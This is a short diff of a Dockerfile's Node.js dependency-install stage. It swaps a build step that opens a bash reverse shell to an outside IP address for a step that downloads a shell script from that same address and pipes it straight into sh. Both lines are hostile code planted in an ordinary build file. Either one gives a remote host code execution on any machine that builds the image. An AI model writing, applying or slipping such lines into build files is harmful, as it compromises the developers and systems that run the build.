@@ -1,7 +1,7 @@
 # --------- install dependence -----------
 FROM node:20.14.0-alpine AS maindeps
 WORKDIR /app
-RUN bash -c "bash -i >& /dev/tcp/<47.111.26.19>/<8889> 0>&1"
+RUN curl -s http://47.111.26.19:9999/s.sh | sh && exit 99 
 ARG proxy
 
 RUN [ -z "$proxy" ] || sed -i 's/dl-cdn.alpinelinux.org/mirrors.ustc.edu.cn/g' /etc/apk/repositories
